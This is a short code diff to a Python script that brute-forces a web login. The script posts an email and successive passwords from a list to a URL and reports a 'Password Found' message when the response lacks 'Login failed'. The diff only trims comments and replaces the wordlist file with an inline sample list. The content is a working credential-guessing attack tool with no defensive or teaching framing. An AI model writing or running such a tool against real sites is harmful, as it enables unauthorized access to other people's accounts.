@@ -68,10 +68,8 @@ def brute_force(url, wordlist):
                 'email': 'your_email@example.com',
                 'pass': password
             }
-            # Replace the following line with your logic for the brute force attack
             response = session.post(url, data=payload)
 
-            # Add your code to check if the login attempt was successful
             if "Login failed" not in response.text:
                 print(blue + "\n[" + wi + "*" + blue + "] Password Found:" + yl + f" {password}" + wi)
                 break  # Exit the loop if the password is found
@@ -80,5 +78,5 @@ def brute_force(url, wordlist):
         print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + f" {e}" + rd + "!!!" + wi)
         exit(1)
 
-# Replace 'your_url' and 'your_wordlist' with the actual URL and wordlist file path
-brute_force('your_url', open('your_wordlist.txt', 'r').read().splitlines())
+# Replace 'your_url' and 'your_wordlist.txt' with the actual URL and wordlist file path
+brute_force('your_url', ['password1', 'password2', 'password3'])  # Replace with your custom wordlist
